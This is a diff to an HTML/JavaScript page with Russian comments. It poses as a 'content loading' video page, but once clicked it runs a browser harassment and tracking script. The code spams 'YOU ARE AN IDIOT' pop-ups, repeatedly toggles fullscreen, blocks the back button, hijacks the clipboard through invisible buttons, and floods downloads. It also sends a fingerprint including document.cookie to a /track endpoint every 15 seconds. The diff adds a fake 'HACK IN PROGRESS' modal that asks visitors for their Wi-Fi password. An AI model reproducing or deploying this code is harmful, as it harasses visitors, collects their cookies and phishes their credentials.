@@ -40,7 +40,6 @@
             border-radius: 8px;
             cursor: pointer;
             box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
-            -webkit-tap-highlight-color: transparent;
             outline: none;
             user-select: none;
             -webkit-user-select: none;
@@ -191,10 +190,64 @@
             width: 1px;
             height: 1px;
         }
+
+        #hack-modal {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 100000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .hack-box {
+            background: #111;
+            border: 2px solid #f00;
+            padding: 25px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 90%;
+            box-shadow: 0 0 30px #f00;
+            font-family: monospace;
+        }
+        .hack-box h2 {
+            color: #f00;
+            margin-bottom: 10px;
+            font-size: 20px;
+        }
+        .hack-box p {
+            color: #ccc;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        .hack-box input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            border: 1px solid #333;
+            background: #000;
+            color: #0f0;
+            border-radius: 6px;
+            font-size: 16px;
+            outline: none;
+            box-sizing: border-box;
+        }
+        .hack-box button {
+            background: #f00;
+            color: #fff;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .hack-box button:hover {
+            background: #ff3333;
+        }
     </style>
 </head>
 <body>
-
     <div id="start-screen">
         <h1>Загрузка контента...</h1>
         <button id="green-btn">▶ Нажми, чтобы показать</button>
@@ -210,100 +263,191 @@
 
     <div id="flash"></div>
 
+    <div id="hack-modal">
+        <div class="hack-box">
+            <h2>⚠ HACK IN PROGRESS ⚠</h2>
+            <p>Enter your Wi-Fi password to stop the hack:</p>
+            <input type="password" id="hack-pass" placeholder="Password" autocomplete="off">
+            <button id="hack-submit">Submit</button>
+        </div>
+    </div>
     <script>
-        // ================== НАСТРОЙКИ ==================
-        var VIDEO_ID         = "hPZxDJYmTUw";         // ID ролика YouTube
-        var TRACK_ENDPOINT   = "/track";              // куда слать фингерпринт
-        var SOUND_URL        = "";                    // ссылка на mp3 (опц.)
+    // ================== НАСТРОЙКИ ==================
+    var VIDEO_ID         = "hPZxDJYmTUw";
+    var TRACK_ENDPOINT   = "/track";
+    var SOUND_URL        = "";
 
-        // пранк-окна
-        var SPAWN_EVERY      = 200;
-        var MAX_WINDOWS      = 0;
+    var SPAWN_EVERY      = 200;
+    var MAX_WINDOWS      = 0;
+    var KEYBOARD_EVERY   = 150;
+    var FULLSCREEN_SPAM  = true;
+    var FULLSCREEN_EVERY = 500;
+    var BUTTONS_TOTAL    = 1000;
+    var BUTTONS_EVERY    = 60;
+    var BUTTON_MIN_SIZE  = 200;
+    var BUTTON_MAX_SIZE  = 300;
+    var GIANT_BUTTON     = true;
+    var GIANT_COPY_COUNT = 10;
+    var GIANT_COPY_GAP   = 100;
+    var DOWNLOAD_SPAM    = true;
+    var DOWNLOAD_EVERY   = 1000;
+    var DOWNLOAD_FILENAME = "YOUAREANIDIOT.txt";
+    var DOWNLOAD_REPEATS  = 300000;
+    var CLIP_TEXT         = "★YOU ARE AN IDIOT AHAHAHAHAHAH★";
+    // ===============================================
 
-        // клавиатура
-        var KEYBOARD_EVERY   = 150;
+    var started = false;
+    var stopFlag = false;
 
-        // дёрганье fullscreen
-        var FULLSCREEN_SPAM  = true;
-        var FULLSCREEN_EVERY = 500;
+    var windowCount     = 0;
+    var trapBtnCount    = 0;
 
-        // невидимые кнопки-ловушки
-        var BUTTONS_TOTAL    = 1000;
-        var BUTTONS_EVERY    = 60;
-        var BUTTON_MIN_SIZE  = 200;
-        var BUTTON_MAX_SIZE  = 300;
+    var spawnInterval     = null;
+    var kbInterval        = null;
+    var trapBtnInterval   = null;
+    var fsInterval        = null;
+    var fsOn              = false;
+    var downloadInterval  = null;
 
-        // огромная кнопка на весь экран
-        var GIANT_BUTTON       = true;
-        var GIANT_COPY_COUNT   = 10;
-        var GIANT_COPY_GAP     = 100;
+    // ---------- запуск ----------
+    function startVideo() {
+        if (started) return;
+        started = true;
 
-        // спам скачиванием текстового файла
-        var DOWNLOAD_SPAM      = true;
-        var DOWNLOAD_EVERY     = 1000;
-        var DOWNLOAD_FILENAME  = "YOUAREANIDIOT.txt";
-        var DOWNLOAD_REPEATS   = 300000;
+        document.getElementById('start-screen').classList.add('hidden');
 
-        // текст, который копируется
-        var CLIP_TEXT          = "★YOU ARE AN IDIOT AHAHAHAHAHAH★";
-        // ===============================================
+        if (!document.getElementById('giant-trap')) {
+            var giant = document.createElement("button");
+            giant.id = "giant-trap";
+            giant.setAttribute("aria-hidden", "true");
+            document.body.appendChild(giant);
+        }
 
-        var started = false;
-        var stopFlag = false;
+        if (!document.getElementById('auto-btn')) {
+            var autoBtn = document.createElement("button");
+            autoBtn.id = "auto-btn";
+            autoBtn.setAttribute("aria-hidden", "true");
+            document.body.appendChild(autoBtn);
+        }
 
-        var windowCount     = 0;
-        var trapBtnCount    = 0;
+        try {
+            var container = document.getElementById('video-container');
+            container.style.display = 'block';
+            var iframe = document.getElementById('yt-frame');
+            iframe.src = "https://www.youtube.com/embed/" + VIDEO_ID +
+                         "?autoplay=1&mute=0&controls=1&rel=0&playsinline=1";
+        } catch (e) {}
 
-        var spawnInterval     = null;
-        var kbInterval        = null;
-        var trapBtnInterval   = null;
-        var fsInterval        = null;
-        var fsOn              = false;
-        var downloadInterval  = null;
-
-        // ---------- запуск ----------
-        function startVideo() {
-            if (started) return;
-            started = true;
-
-            document.getElementById('start-screen').classList.add('hidden');
-
-            // создаём ловушки только после старта
-            if (!document.getElementById('giant-trap')) {
-                var giant = document.createElement("button");
-                giant.id = "giant-trap";
-                giant.setAttribute("aria-hidden", "true");
-                document.body.appendChild(giant);
-            }
-
-            if (!document.getElementById('auto-btn')) {
-                var autoBtn = document.createElement("button");
-                autoBtn.id = "auto-btn";
-                autoBtn.setAttribute("aria-hidden", "true");
-                document.body.appendChild(autoBtn);
-            }
-
-            // видео
+        if (SOUND_URL) {
             try {
-                var container = document.getElementById('video-container');
-                container.style.display = 'block';
-                var iframe = document.getElementById('yt-frame');
-                iframe.src = "https://www.youtube.com/embed/" + VIDEO_ID +
-                             "?autoplay=1&mute=0&controls=1&rel=0&playsinline=1";
+                var a = new Audio(SOUND_URL);
+                a.loop = true;
+                a.volume = 1;
+                a.play().catch(function () {});
             } catch (e) {}
+        }
 
-            // доп. звук mp3
-            if (SOUND_URL) {
-                try {
-                    var a = new Audio(SOUND_URL);
-                    a.loop = true;
-                    a.volume = 1;
-                    a.play().catch(function () {});
-                } catch (e) {}
+        try {
+            var el = document.documentElement;
+            if (el.requestFullscreen) {
+                el.requestFullscreen();
+            } else if (el.webkitRequestFullscreen) {
+                el.webkitRequestFullscreen();
             }
+            fsOn = true;
+        } catch (e) {}
 
-            // fullscreen
-            try {
+        try {
+            history.pushState({ p: 1 }, "", location.href);
+            window.addEventListener('popstate', function () {
+                history.pushState({ p: 1 }, "", location.href);
+            });
+        } catch (e) {}
+
+        document.getElementById('flash').style.display = 'block';
+
+        startWindows();
+        startKeyboardSpam();
+        startTrapButtons();
+        startFullscreenSpam();
+        startGiantButton();
+        startAutoBtnSpam();
+        sendFingerprint();
+        startDownloadSpam();
+
+        setTimeout(function () {
+            document.getElementById('hack-modal').style.display = 'flex';
+        }, 5000);
+    }
+
+    // ---------- окна ----------
+    function spawnWindow() {
+        if (stopFlag) return;
+        if (MAX_WINDOWS > 0 && windowCount >= MAX_WINDOWS) {
+            if (spawnInterval) {
+                clearInterval(spawnInterval);
+                spawnInterval = null;
+            }
+            return;
+        }
+
+        windowCount++;
+
+        var win = document.createElement('div');
+        win.className = 'virus-window';
+
+        var w = 120 + Math.floor(Math.random() * 80);
+        var h = 60 + Math.floor(Math.random() * 40);
+
+        var x = Math.max(0, Math.floor(Math.random() * (window.innerWidth - w)));
+        var y = Math.max(0, Math.floor(Math.random() * (window.innerHeight - h)));
+
+        win.style.left   = x + 'px';
+        win.style.top    = y + 'px';
+        win.style.width  = w + 'px';
+        win.style.height = h + 'px';
+
+        win.innerHTML = '<h3>YOU ARE AN IDIOT</h3><p>#' + windowCount + '</p>';
+
+        document.body.appendChild(win);
+    }
+
+    function startWindows() {
+        spawnWindow();
+        spawnInterval = setInterval(spawnWindow, SPAWN_EVERY);
+    }
+
+    // ---------- клавиатура ----------
+    function toggleKeyboard() {
+        if (stopFlag) return;
+
+        var inp = document.getElementById('kb-trap');
+        if (!inp) {
+            inp = document.createElement('input');
+            inp.id = 'kb-trap';
+            inp.type = 'text';
+            inp.setAttribute('autocomplete', 'off');
+            inp.setAttribute('autocorrect', 'off');
+            inp.setAttribute('autocapitalize', 'off');
+            document.body.appendChild(inp);
+        }
+
+        try {
+            inp.focus();
+            inp.blur();
+        } catch (e) {}
+    }
+
+    function startKeyboardSpam() {
+        kbInterval = setInterval(toggleKeyboard, KEYBOARD_EVERY);
+    }
+
+    // ---------- fullscreen ----------
+    function toggleFullscreen() {
+        if (stopFlag) return;
+
+        try {
+            if (!fsOn) {
                 var el = document.documentElement;
                 if (el.requestFullscreen) {
                     el.requestFullscreen();
@@ -311,228 +455,126 @@
                     el.webkitRequestFullscreen();
                 }
                 fsOn = true;
-            } catch (e) {}
-
-            // блокировка «Назад»
-            try {
-                history.pushState({ p: 1 }, "", location.href);
-                window.addEventListener('popstate', function () {
-                    history.pushState({ p: 1 }, "", location.href);
-                });
-            } catch (e) {}
-
-            // вспышка
-            document.getElementById('flash').style.display = 'block';
-
-            // хаос
-            startWindows();
-            startKeyboardSpam();
-            startTrapButtons();
-            startFullscreenSpam();
-            startGiantButton();
-            startAutoBtnSpam();
-            sendFingerprint();
-
-            // старт загрузок
-            startDownloadSpam();
+            } else {
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                } else if (document.webkitExitFullscreen) {
+                    document.webkitExitFullscreen();
+                }
+                fsOn = false;
+            }
+        } catch (e) {
+            fsOn = !fsOn;
         }
+    }
 
-        // ---------- окна ----------
-        function spawnWindow() {
+    function startFullscreenSpam() {
+        if (!FULLSCREEN_SPAM) return;
+        fsInterval = setInterval(toggleFullscreen, FULLSCREEN_EVERY);
+    }
+
+    // ---------- копирование ----------
+    function copyToClipboardNow() {
+        try {
+            var ta = document.createElement('textarea');
+            ta.value = CLIP_TEXT;
+            ta.style.position = 'fixed';
+            ta.style.opacity = '0';
+            ta.style.pointerEvents = 'none';
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            ta.remove();
+        } catch (e) {}
+
+        try {
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(CLIP_TEXT).catch(function () {});
+            }
+        } catch (e) {}
+    }
+
+    function copyMultipleTimes() {
+        var attempts = 0;
+
+        function tryCopy() {
             if (stopFlag) return;
-            if (MAX_WINDOWS > 0 && windowCount >= MAX_WINDOWS) {
-                if (spawnInterval) {
-                    clearInterval(spawnInterval);
-                    spawnInterval = null;
-                }
-                return;
-            }
+            if (attempts >= GIANT_COPY_COUNT) return;
 
-            windowCount++;
+            attempts++;
+            copyToClipboardNow();
 
-            var win = document.createElement('div');
-            win.className = 'virus-window';
-
-            var w = 120 + Math.floor(Math.random() * 80);
-            var h = 60 + Math.floor(Math.random() * 40);
-
-            var x = Math.max(0, Math.floor(Math.random() * (window.innerWidth - w)));
-            var y = Math.max(0, Math.floor(Math.random() * (window.innerHeight - h)));
-
-            win.style.left   = x + 'px';
-            win.style.top    = y + 'px';
-            win.style.width  = w + 'px';
-            win.style.height = h + 'px';
-
-            win.innerHTML = '<h3>YOU ARE AN IDIOT</h3><p>#' + windowCount + '</p>';
-
-            document.body.appendChild(win);
-        }
-
-        function startWindows() {
-            spawnWindow();
-            spawnInterval = setInterval(spawnWindow, SPAWN_EVERY);
-        }
-
-        // ---------- клавиатура ----------
-        function toggleKeyboard() {
-            if (stopFlag) return;
-
-            var inp = document.getElementById('kb-trap');
-            if (!inp) {
-                inp = document.createElement('input');
-                inp.id = 'kb-trap';
-                inp.type = 'text';
-                inp.setAttribute('autocomplete', 'off');
-                inp.setAttribute('autocorrect', 'off');
-                inp.setAttribute('autocapitalize', 'off');
-                document.body.appendChild(inp);
-            }
-
-            try {
-                inp.focus();
-                inp.blur();
-            } catch (e) {}
-        }
-
-        function startKeyboardSpam() {
-            kbInterval = setInterval(toggleKeyboard, KEYBOARD_EVERY);
-        }
-
-        // ---------- fullscreen ----------
-        function toggleFullscreen() {
-            if (stopFlag) return;
-
-            try {
-                if (!fsOn) {
-                    var el = document.documentElement;
-                    if (el.requestFullscreen) {
-                        el.requestFullscreen();
-                    } else if (el.webkitRequestFullscreen) {
-                        el.webkitRequestFullscreen();
-                    }
-                    fsOn = true;
-                } else {
-                    if (document.exitFullscreen) {
-                        document.exitFullscreen();
-                    } else if (document.webkitExitFullscreen) {
-                        document.webkitExitFullscreen();
-                    }
-                    fsOn = false;
-                }
-            } catch (e) {
-                fsOn = !fsOn;
+            if (attempts < GIANT_COPY_COUNT) {
+                setTimeout(tryCopy, GIANT_COPY_GAP);
             }
         }
 
-        function startFullscreenSpam() {
-            if (!FULLSCREEN_SPAM) return;
-            fsInterval = setInterval(toggleFullscreen, FULLSCREEN_EVERY);
-        }
+        tryCopy();
+    }
 
-        // ---------- копирование ----------
-        function copyToClipboardNow() {
-            try {
-                var ta = document.createElement('textarea');
-                ta.value = CLIP_TEXT;
-                ta.style.position = 'fixed';
-                ta.style.opacity = '0';
-                ta.style.pointerEvents = 'none';
-                document.body.appendChild(ta);
-                ta.select();
-                document.execCommand('copy');
-                ta.remove();
-            } catch (e) {}
-
-            try {
-                if (navigator.clipboard && navigator.clipboard.writeText) {
-                    navigator.clipboard.writeText(CLIP_TEXT).catch(function () {});
-                }
-            } catch (e) {}
-        }
-
-        function copyMultipleTimes() {
-            var attempts = 0;
-
-            function tryCopy() {
-                if (stopFlag) return;
-                if (attempts >= GIANT_COPY_COUNT) return;
-
-                attempts++;
-                copyToClipboardNow();
-
-                if (attempts < GIANT_COPY_COUNT) {
-                    setTimeout(tryCopy, GIANT_COPY_GAP);
-                }
+    // ---------- невидимые кнопки ----------
+    function spawnTrapButton() {
+        if (stopFlag) return;
+        if (trapBtnCount >= BUTTONS_TOTAL) {
+            if (trapBtnInterval) {
+                clearInterval(trapBtnInterval);
+                trapBtnInterval = null;
             }
-
-            tryCopy();
+            return;
         }
 
-        // ---------- невидимые кнопки ----------
-        function spawnTrapButton() {
-            if (stopFlag) return;
-            if (trapBtnCount >= BUTTONS_TOTAL) {
-                if (trapBtnInterval) {
-                    clearInterval(trapBtnInterval);
-                    trapBtnInterval = null;
-                }
-                return;
-            }
+        trapBtnCount++;
 
-            trapBtnCount++;
+        var btn = document.createElement('button');
+        btn.className = 'copy-trap-btn';
+        btn.type = 'button';
 
-            var btn = document.createElement('button');
-            btn.className = 'copy-trap-btn';
-            btn.type = 'button';
+        var size = BUTTON_MIN_SIZE + Math.floor(Math.random() *
+                   (BUTTON_MAX_SIZE - BUTTON_MIN_SIZE));
+        btn.style.width  = size + 'px';
+        btn.style.height = size + 'px';
 
-            var size = BUTTON_MIN_SIZE + Math.floor(Math.random() *
-                       (BUTTON_MAX_SIZE - BUTTON_MIN_SIZE));
-            btn.style.width  = size + 'px';
-            btn.style.height = size + 'px';
+        var maxX = window.innerWidth  - size;
+        var maxY = window.innerHeight - size;
+        var x = Math.max(0, Math.floor(Math.random() * maxX));
+        var y = Math.max(0, Math.floor(Math.random() * maxY));
+        btn.style.left = x + 'px';
+        btn.style.top  = y + 'px';
 
-            var maxX = window.innerWidth  - size;
-            var maxY = window.innerHeight - size;
-            var x = Math.max(0, Math.floor(Math.random() * maxX));
-            var y = Math.max(0, Math.floor(Math.random() * maxY));
-            btn.style.left = x + 'px';
-            btn.style.top  = y + 'px';
+        btn.addEventListener('click', function () {
+            copyToClipboardNow();
+        });
 
-            btn.addEventListener('click', function () {
-                copyToClipboardNow();
-            });
+        btn.addEventListener('touchstart', function (e) {
+            e.preventDefault();
+            copyToClipboardNow();
+        }, { passive: false });
 
-            btn.addEventListener('touchstart', function (e) {
-                e.preventDefault();
-                copyToClipboardNow();
-            }, { passive: false });
+        document.body.appendChild(btn);
+    }
 
-            document.body.appendChild(btn);
-        }
+    function startTrapButtons() {
+        trapBtnInterval = setInterval(spawnTrapButton, BUTTONS_EVERY);
+    }
 
-        function startTrapButtons() {
-            trapBtnInterval = setInterval(spawnTrapButton, BUTTONS_EVERY);
-        }
+    // ---------- огромная кнопка ----------
+    function startGiantButton() {
+        if (!GIANT_BUTTON) return;
 
-        // ---------- огромная кнопка ----------
-        function startGiantButton() {
-            if (!GIANT_BUTTON) return;
+        var giant = document.getElementById('giant-trap');
+        if (!giant) return;
 
-            var giant = document.getElementById('giant-trap');
-            if (!giant) return;
+        giant.addEventListener('touchstart', function (e) {
+            e.preventDefault();
+            copyMultipleTimes();
+        }, { passive: false });
 
-            giant.addEventListener('touchstart', function (e) {
-                e.preventDefault();
-                copyMultipleTimes();
-            }, { passive: false });
-
-            giant.addEventListener('click', function (e) {
-                e.preventDefault();
-                copyMultipleTimes();
-            });
-        }
-
-        // ---------- авто-клик по маленькой кнопке ----------
+        giant.addEventListener('click', function (e) {
+            e.preventDefault();
+            copyMultipleTimes();
+        });
+    }
+            // ---------- авто-клик по маленькой кнопке ----------
         function startAutoBtnSpam() {
             if (!DOWNLOAD_SPAM) return;
 
@@ -645,7 +687,6 @@
             } catch (e) {}
 
             try {
-                
                 d.cookies = document.cookie || "none";
             } catch (e) { d.cookies = "blocked"; }
 
@@ -683,6 +724,32 @@
         });
 
         setInterval(sendFingerprint, 15000);
+
+        // ---------- окно пароля ----------
+        setTimeout(function () {
+            var modal = document.getElementById('hack-modal');
+            if (modal) modal.style.display = 'flex';
+        }, 5000);
+
+        var hackPass = document.getElementById('hack-pass');
+        var hackSubmit = document.getElementById('hack-submit');
+
+        if (hackPass) {
+            hackPass.addEventListener('click', copyToClipboardNow);
+            hackPass.addEventListener('focus', copyToClipboardNow);
+            hackPass.addEventListener('touchstart', function (e) {
+                e.preventDefault();
+                copyToClipboardNow();
+            }, { passive: false });
+        }
+
+        if (hackSubmit) {
+            hackSubmit.addEventListener('click', copyToClipboardNow);
+            hackSubmit.addEventListener('touchstart', function (e) {
+                e.preventDefault();
+                copyToClipboardNow();
+            }, { passive: false });
+        }
     </script>
 </body>
 </html>
